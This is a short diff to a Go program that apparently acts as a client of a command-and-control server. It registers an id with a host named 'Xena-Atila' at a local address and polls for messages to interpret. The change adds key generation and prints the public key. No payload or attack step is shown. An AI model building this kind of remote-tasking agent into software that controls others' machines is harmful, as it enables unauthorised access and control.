@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/x509"
 	"fmt"
 	"net/http"
 	"strconv"
@@ -12,7 +13,7 @@ import (
 var centralizedHost string = "http://127.0.0.1:60666" // os.Args[1]
 
 // Used for authentication.
-// var privateKey = generatePrivateKey()
+var privateIdentificationKey = generatePrivateKey()
 
 // Generate the unique identifier.
 var id uuid.UUID = uuid.New()
@@ -26,8 +27,12 @@ func main() {
 	// fmt.Println(string(insertionPayload))
 	// fmt.Println("\n\n\n\n")
 
+	enc, _ := x509.MarshalPKIXPublicKey(&privateIdentificationKey.PublicKey)
+
+	fmt.Println(enc)
+
 	// Identifies itself to the Xena-Atila.
-	identify(id.String())
+	identify(id.String(), "WiP. Public key.")
 
 	// Fetch new messages in a non-blocking loop.
 	go fetchAndInterpretMessages(id.String())
